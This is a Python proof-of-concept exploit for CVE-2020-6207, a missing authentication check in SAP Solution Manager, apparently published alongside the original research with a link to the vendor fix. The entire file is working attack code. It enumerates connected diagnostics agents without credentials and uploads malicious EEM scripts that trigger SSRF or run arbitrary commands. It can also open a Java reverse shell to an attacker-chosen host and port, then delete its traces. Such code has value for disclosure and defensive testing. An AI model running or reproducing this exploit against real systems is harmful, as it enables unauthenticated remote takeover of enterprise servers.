#!/usr/bin/env python3

__author__ = 'chipik'

import random
import base64
import requests
import argparse
import xml.etree.ElementTree as ET
from prettytable import PrettyTable


help_desc = '''
PoC for CVE-2020-6207, (Missing Authentication Check in SAP Solution Manager)
This script allows to check and exploit missing authentication checks in SAP EEM servlet (tc~smd~agent~application~eem) that lead to RCE on SAP SMDAgents connected to SAP Solution Manager
Original finding: 
- Pablo Artuso. https://twitter.com/lmkalg
- Yvan 'iggy' G https://twitter.com/_1ggy

Paper: https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf
Solution: https://launchpad.support.sap.com/#/notes/2890213

twitter: https://twitter.com/_chipik
'''

eemURL = "/EemAdminService/EemAdmin"

wsdlMethods = {
'getAgentInfo' : '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/">
   <soapenv:Header/>
   <soapenv:Body>
      <adm:getAgentInfo>
         <agents></agents>
      </adm:getAgentInfo>
   </soapenv:Body>
</soapenv:Envelope>''',

'getAllAgentInfo':'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/">
   <soapenv:Header/>
   <soapenv:Body>
      <adm:getAllAgentInfo/>
   </soapenv:Body>
</soapenv:Envelope>''',

'setAgeletProperties' : '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/">
   <soapenv:Header/>
   <soapenv:Body>
      <adm:setAgeletProperties>
         <agentName></agentName>
         <propertyInfos>
            <flags>3</flags>
            <key></key>
            <value></value>
         </propertyInfos>
      </adm:setAgeletProperties>
   </soapenv:Body>
</soapenv:Envelope>''',

'uploadResource':'''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/">
   <soapenv:Header/>
   <soapenv:Body>
      <adm:uploadResource>
         <agentName></agentName>
         <fileInfos>
            <content></content>
            <fileName></fileName>
            <scenarioName></scenarioName>
            <scope></scope>
            <scriptName></scriptName>
         </fileInfos>
      </adm:uploadResource>
   </soapenv:Body>
</soapenv:Envelope>
''',

'stopScript':'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/">
   <soapenv:Header/>
   <soapenv:Body>
      <adm:stopScript>
         <agentName></agentName>
         <scriptName></scriptName>
      </adm:stopScript>
   </soapenv:Body>
</soapenv:Envelope>''',

'deleteScript':'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/">
   <soapenv:Header/>
   <soapenv:Body>
      <adm:deleteScript>
         <agentName></agentName>
         <scriptName></scriptName>
      </adm:deleteScript>
   </soapenv:Body>
</soapenv:Envelope>''',

'setServerName':'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/">
   <soapenv:Header/>
   <soapenv:Body>
      <adm:setServerName>
         <hostName></hostName>
         <instanceName></instanceName>
         <newServerName></newServerName>
      </adm:setServerName>
   </soapenv:Body>
</soapenv:Envelope>''',

}

def makeRequest(payload):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6207 PoC",
        "Content-Type": "text/xml;charset=UTF-8",
        "SOAPAction": ""}
    ans = requests.post(base_url + eemURL, headers=headers, proxies=proxies, timeout=timeout,
                        data=payload,
                        allow_redirects=False, verify=False)
    return ans

def getAllAgentInfo():
    customPrint("Sending getAllAgentInfo()...")
    root = ET.fromstring(wsdlMethods['getAllAgentInfo'])
    payload = ET.tostring(root, encoding='utf8', method='xml')
    resp = makeRequest(payload)
    return resp

def getAgentInfo(agents):
    customPrint(f"Sending getAgentInfo({agents})...")
    root = ET.fromstring(wsdlMethods['getAgentInfo'])
    root.find('.//agents').text = agents
    payload = ET.tostring(root, encoding='utf8', method='xml')
    resp = makeRequest(payload)
    return resp

def uploadResource(agentName, content, scriptName, fileName = "script.http.xml", scenarioName=f'PoCScenario{(random.randint(1, 10000))}', scope = "Script"):
    customPrint(f"Sending uploadResource(). ScriptName:{scriptName}...")
    content  = base64.b64encode(content.encode('ascii')).decode('ascii')
    root = ET.fromstring(wsdlMethods['uploadResource'])
    root.find('.//agentName').text = agentName
    root.find('.//content').text = content
    root.find('.//fileName').text = fileName
    root.find('.//scenarioName').text = scenarioName
    root.find('.//scope').text = scope
    root.find('.//scriptName').text = scriptName
    payload = ET.tostring(root, encoding='utf8', method='xml')
    resp = makeRequest(payload)
    return resp

def setAgeletProperties(agentName, key, value):
    customPrint(f"Sending setAgeletProperties({agentName}, {key}, {value})...")
    root = ET.fromstring(wsdlMethods['setAgeletProperties'])
    root.find('.//agentName').text = agentName
    root.find('.//key').text = key
    root.find('.//value').text = value
    payload = ET.tostring(root, encoding='utf8', method='xml')
    resp = makeRequest(payload)
    return resp

def stopScript(agentName, scriptName):
    customPrint(f"Sending stopScript({agentName},{scriptName})...")
    root = ET.fromstring(wsdlMethods['stopScript'])
    root.find('.//agentName').text = agentName
    root.find('.//scriptName').text = scriptName
    payload = ET.tostring(root, encoding='utf8', method='xml')
    resp = makeRequest(payload)
    return resp

def deleteScript(agentName, scriptName):
    customPrint(f"Sending deleteScript({agentName},{scriptName})...")
    root = ET.fromstring(wsdlMethods['deleteScript'])
    root.find('.//agentName').text = agentName
    root.find('.//scriptName').text = scriptName
    payload = ET.tostring(root, encoding='utf8', method='xml')
    resp = makeRequest(payload)
    return resp

def setServerName(hostName, instanceName, newServerName):
    customPrint(f"Sending setServerName({hostName},{instanceName},{newServerName})...")
    root = ET.fromstring(wsdlMethods['setServerName'])
    root.find('.//hostName').text = hostName
    root.find('.//instanceName').text = instanceName
    root.find('.//newServerName').text = newServerName
    payload = ET.tostring(root, encoding='utf8', method='xml')
    resp = makeRequest(payload)
    return resp

def detect_vuln(base_url):
    is_vulnerable = False
    status = 'Not Vulnerable!'
    ans = getAllAgentInfo()
    status_code = ans.status_code
    if status_code == 200:
        is_vulnerable = True
        status = 'Vulnerable! [CVE-2020-6207]'
    print("%s - %s" % (status, base_url))
    return {"status": is_vulnerable}

def customPrint(prnt):
    if args.verbose:
        print(f"[INFO] {prnt}")

def getAllAgentsPretty():
    # Getting available SMD agents
    customPrint("Getting available agents...")
    resp = getAllAgentInfo()
    if resp.status_code != 200:
        print(f"Something wrong with getAllAgentInfo(). Got {resp.status_code} status code")
        exit(1)
    agentsResp = ET.fromstring(resp.content)
    for agent in agentsResp[0][0]:
        os_val = agent.find(".//systemProperties/[key='os.name']").find("value").text if agent.find(
            ".//systemProperties/[key='os.name']") is not None else ""
        jvm_val = agent.find(".//systemProperties/[key='java.version']").find("value").text if agent.find(
            ".//systemProperties/[key='java.version']") is not None else ""
        agentVal = {
            'serverName': f'{agent.find("serverName").text if agent.find("serverName") is not None else ""}',
            'hostName': f'{agent.find("hostName").text}',
            'instanceName': f'{agent.find("instanceName").text}',
            'status': f'{"up" if agent.find("agentStatus").text == "1" else "stopped"}',
            'os': f'{os_val}',
            'java': f'{jvm_val}',
        }
        agents.append(agentVal)
    if len(agents):
        x = PrettyTable()
        x.field_names = ["serverName", "hostName", "instanceName", "status", "OS", "java"]
        for agent in agents:
            x.add_row(agent.values())
        print(x)
        return agents

def executeScript(payload, clear = True):
    customPrint(f"Executing new script.Payload:\n{payload}")
    if not args.victim:
        getAllAgentsPretty()
        print("If DA doesn't have a serverName you can setup using '--setup' option of that PoC")
        args.victim = input("Enter DA serverName:")
    else:
        print("There is no available DA connected to SAP SM")
        exit(1)
    # Enable EEM
    resp = setAgeletProperties(args.victim, "eem.enable", "True")
    if resp.status_code != 200:
        print(f"Something wrong with setAgeletProperties(). Got {resp.status_code} status code")
        exit(1)
    scriptName = f"PoCScript{random.randint(5000, 10000)}"
    resp = uploadResource(args.victim, payload, scriptName)
    if resp.status_code != 200:
        print(f"Something wrong with uploadResource(). Got {resp.status_code} status code")
        exit(1)
    # Now let's clear the server
    ## Stop our Script
    if clear:
        # We can't stop script while backconnect works
        resp = stopScript(args.victim, scriptName)
        if resp.status_code != 200:
            print(f"Something wrong with stopScript(). Got {resp.status_code} status code")
            exit(1)
        ## Delete our script
        resp = deleteScript(args.victim, scriptName)
        if resp.status_code != 200:
            print(f"Something wrong with deleteScript(). Got {resp.status_code} status code")
            exit(1)
    print("[!] Done")
    return

def clearAfter():
    if not args.victim:
        # Getting available SMD agents
        customPrint("Getting available agents...")
        resp = getAllAgentInfo()
        if resp.status_code != 200:
            print(f"Something wrong with getAllAgentInfo(). Got {resp.status_code} status code")
            exit(1)
        agentsResp = ET.fromstring(resp.content)
        for agent in agentsResp[0][0]:
            os_val = agent.find(".//systemProperties/[key='os.name']").find("value").text if agent.find(
                ".//systemProperties/[key='os.name']") is not None else ""
            jvm_val = agent.find(".//systemProperties/[key='java.version']").find("value").text if agent.find(
                ".//systemProperties/[key='java.version']") is not None else ""
            agentVal = {
                'serverName': f'{agent.find("serverName").text if agent.find("serverName") is not None else ""}',
                'hostName': f'{agent.find("hostName").text}',
                'instanceName': f'{agent.find("instanceName").text}',
                'status': f'{"up" if agent.find("agentStatus").text == "1" else "stopped"}',
                'os': f'{os_val}',
                'java': f'{jvm_val}',
            }
            agents.append(agentVal)
        if len(agents):
            x = PrettyTable()
            x.field_names = ["serverName", "hostName", "instanceName", "status", "OS", "java"]
            for agent in agents:
                x.add_row(agent.values())
            print(x)
            args.victim = input("Enter DA serverName:")
        else:
            print("There is no available DA connected to SAP SM")
            exit(1)
    resp = getAgentInfo(args.victim)
    if resp.status_code != 200:
        print(f"Something wrong with getAgentInfo(). Got {resp.status_code} status code")
        exit(1)
    agentsResp = ET.fromstring(resp.content)
    ourScript = []
    for our in agentsResp[0][0].findall(".//agentProperties/key"):
        if "eem/Script/PoCScript" in our.text:
            ourScript.append(our.text.split('/')[2])
    if not len(ourScript):
        print("Nothing to clear")
        exit(1)
    else:
        print(f"Found these artifacts: {', '.join(ourScript)}")
    print("Deleting...")
    for script in ourScript:
        resp = stopScript(args.victim, script)
        if resp.status_code != 200:
            print(f"Something wrong with stopScript({args.victim}, {script}). Got {resp.status_code} status code")
            exit(1)
        resp = deleteScript(args.victim, script)
        if resp.status_code != 200:
            print(f"Something wrong with stopScript({args.victim}, {script}). Got {resp.status_code} status code")
            exit(1)
    print("Done!")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-H', '--host', default='127.0.0.1', help='SAP Solution Manager host(default: 127.0.0.1)')
    parser.add_argument('-P', '--port', default=50000, type=int, help='SAP Solution Manager web port (default: tcp/50000)')
    parser.add_argument('-p', '--proxy', help='Use proxy (ex: 127.0.0.1:8080)')
    parser.add_argument('-s', '--ssl', action='store_true', help='enable SSL')
    parser.add_argument('-c', '--check', action='store_true', help='just detect vulnerability')
    parser.add_argument('-d', '--victim', help='DA serverName')
    parser.add_argument('--ssrf', help='exploit SSRF. Point http address here. (example:http://1.1.1.1/chpk)')
    parser.add_argument('--rce', help='exploit RCE')
    parser.add_argument('--back', help='get backConnect from DA. (ex: 1.1.1.1:1337)')
    parser.add_argument('--setup', help='setup a random serverName to the DA with the given hostName and instanceName. (example: javaup.mshome.net,SMDA97)')
    parser.add_argument('--list', action='store_true', help='Get a list of existing DA servers')
    parser.add_argument('--clear', action='store_true', help='stop and delete all PoCScript<rnd> scripts from DA servers')
    parser.add_argument('-t', '--timeout', default=10, type=int, help='HTTP connection timeout in second (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')
    args = parser.parse_args()
    timeout = args.timeout

    proxies = {}
    verify = True
    agents = []
    if args.proxy:
        verify = False
        proxies = {
            'http': args.proxy,
            'https': args.proxy,
        }
    if args.ssl:
        base_url = "https://%s:%s" % (args.host, args.port)
    else:
        base_url = "http://%s:%s" % (args.host, args.port)
    if args.check:
        detect_vuln(base_url)
        exit()
    if args.ssrf:
        # Prepare ssrf payload
        customPrint(f"Will send SSRF on {args.ssrf}")
        payload = f'<?xml version="1.0" encoding="UTF-8"?><Script xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" editorversion="7.10.1.0.20101027150712" exetype="xml" hrtimestamp="2010.10.27 15:11:20 CEST" name="simple_secure" timestamp="1288185080821" type="http" version="1.1" xsi:noNamespaceSchemaLocation="http://www.sap.com/solman/eem/script1.1"><TransactionStep id="1" name="dummy"><Message activated="true" id="2" method="GET" name="index" type="ServerRequest" url="{args.ssrf}" version="HTTP/1.1"></Message></TransactionStep></Script>'
        executeScript(payload)
    if args.rce:
        # Prepare RCE payload
        customPrint(f"Will trigger {args.rce}")
        pload = f"Packages.java.lang.Runtime.getRuntime().exec('{args.rce}').waitFor();"
        payload = f'<?xml version="1.0" encoding="UTF-8"?><Script xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" editorversion="7.10.1.0.20101027150712" exetype="xml" hrtimestamp="2010.10.27 15:11:20 CEST" name="chpk" timestamp="1288185080821" type="http" version="1.1" xsi:noNamespaceSchemaLocation="http://www.sap.com/solman/eem/script1.1"><TransactionStep id="1" name="dummy"><Message activated="true" id="2" type="Command" url="" name="AssignJS" method="AssignJS" ><Param name = "expression" value="{pload}" /><Param name = "variable" value="chpk" /></Message></TransactionStep></Script>'
        executeScript(payload)
    if args.back:
        # Prepare back connect
        customPrint(f"Let's get backConnect to {args.back}")
        osType = input("What is the DA OS (win/nix)?:")
        if osType == "win":
            shell = "cmd.exe"
        else:
            shell = "/bin/bash"
        bip = args.back.split(':')[0]
        bport = int(args.back.split(':')[1])
        print(f"Run 'netcat -l -p {bport}' on {bip}")
        pload = f"var p = new Packages.java.lang.ProcessBuilder('{shell}').redirectErrorStream(true).start();var s= new Packages.java.net.Socket('{bip}',{bport});var pi=new Packages.java.io.BufferedInputStream(p.getInputStream());var pe= new Packages.java.io.BufferedInputStream(p.getErrorStream());var si= new Packages.java.io.BufferedInputStream(s.getInputStream());var po= new Packages.java.io.BufferedOutputStream(p.getOutputStream());var so= new Packages.java.io.BufferedOutputStream(s.getOutputStream());while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Packages.java.lang.Thread.sleep(50);}};p.destroy();s.close();"
        payload = f'<?xml version="1.0" encoding="UTF-8"?><Script xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" editorversion="7.10.1.0.20101027150712" exetype="xml" hrtimestamp="2010.10.27 15:11:20 CEST" name="chpk" timestamp="1288185080821" type="http" version="1.1" xsi:noNamespaceSchemaLocation="http://www.sap.com/solman/eem/script1.1"><TransactionStep id="1" name="dummy"><Message activated="true" id="2" type="Command" url="" name="AssignJS" method="AssignJS" ><Param name = "expression" value="{pload}" /><Param name = "variable" value="chpk" /></Message></TransactionStep></Script>'
        print("Don't forget to stop and delete script!")
        executeScript(payload, False)
    if args.clear:
        customPrint(f"Let's clear the server...")
        clearAfter()
    if args.setup:
        customPrint(f"Setting up a serverName for the {args.setup}")
        if len(args.setup.split(',')) !=2:
            print("Wrong '--setup' options. Please specify target like this: 'javaup.mshome.net,SMDA97' or enter values below")
            getAllAgentsPretty()
            hostName = input("hostName:")
            instanceName = input("instanceName:")
        else:
            hostName = args.setup.split(',')[0]
            instanceName = args.setup.split(',')[1]
        newServerName = f"PoCName{(random.randint(1, 10000))}"
        print(f"Setup new serverName {newServerName} for {hostName}")
        resp = setServerName(hostName, instanceName, newServerName)
        if resp.status_code != 200:
            print(f"Something wrong with setServerName({hostName}, {instanceName}, {newServerName}). Got {resp.status_code} status code")
            exit(1)
    if args.list:
        getAllAgentsPretty()







